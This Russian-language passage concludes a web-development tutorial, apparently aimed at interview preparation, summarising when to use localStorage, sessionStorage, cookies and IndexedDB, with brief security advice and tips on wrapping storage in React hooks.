Клиентские хранилища — это мощный инструмент для создания отзывчивых, быстрых и офлайн-устойчивых приложений. Понимание различий между localStorage, sessionStorage, cookies и IndexedDB позволяет выбрать правильное решение для каждой задачи.

**Ключевые выводы:**

1. **localStorage** — для простых данных, которые должны сохраняться между сессиями (настройки, кэш).

2. **sessionStorage** — для временных данных в рамках одной сессии (состояние формы).

3. **Cookies** — для данных, которые должны автоматически отправляться на сервер (аутентификация).

4. **IndexedDB** — для больших объёмов структурированных данных (офлайн-приложения, кэш файлов).

5. **Безопасность** — не храните чувствительные данные в localStorage, используйте HttpOnly cookies для токенов.

6. **React-интеграция** — инкапсулируйте работу с хранилищами в хуки для переиспользования и упрощения тестирования.

Практикуйтесь: создайте хуки для работы с localStorage, попробуйте IndexedDB для кэширования данных, настройте синхронизацию между вкладками. Эти навыки выделят вас среди других кандидатов на собеседовании.
